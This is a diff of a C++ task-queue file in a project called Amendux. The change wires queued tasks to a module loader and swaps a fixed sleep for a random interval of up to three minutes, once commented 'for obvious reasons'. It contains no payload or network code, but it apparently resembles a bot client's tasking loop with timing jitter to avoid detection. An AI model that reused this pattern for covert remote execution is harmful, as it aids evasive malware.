@@ -1,6 +1,7 @@
 #include "stdafx.h"
 #include "Log.h"
 #include "Config.h"
+#include "ModuleLoader.h"
 #include "TaskQueue.h"
 
 using namespace Amendux;
@@ -21,7 +22,7 @@ TaskQueue::~TaskQueue()
 
 void TaskQueue::InitClass()
 {
-	if (!Config::Current()->CanRunModules()) {
+	if (!Config::Current()->CanRunWorker()) {
 		return;
 	}
 }
@@ -44,24 +45,25 @@ void TaskQueue::Add(Task& task)
 
 
 DWORD TaskQueue::Worker() {
+	int nextInterval = 0;
 	while (true) {
-		/* Randomize the interval for obvious reasons */
-		Sleep(2 * 60 * 1000);
-
+		/* Randomize the interval */
+		Sleep((nextInterval) + 100);
 		if (Empty()) {
 			continue;
 		}
 
 		Task task = mainqueue.front();
 
-		Log::Info(L"TaskQueue", L"Execute task " + std::to_wstring(task.GetId()));
+		Log::Info(L"TaskQueue", L"Pop task " + std::to_wstring(task.GetId()) + L" from queue");
 
-		// look for mod and run
-		//if () {
-		//
-		//}
+		if (!ModuleLoader::Current()->RunModule(task.name, task.params)) {
+			Log::Warn(L"TaskQueue", L"Task is not an internal module");
+		}
 
 		mainqueue.pop();
+
+		nextInterval = (rand() % 180) * 1000;
 	}
 
 	return 0;
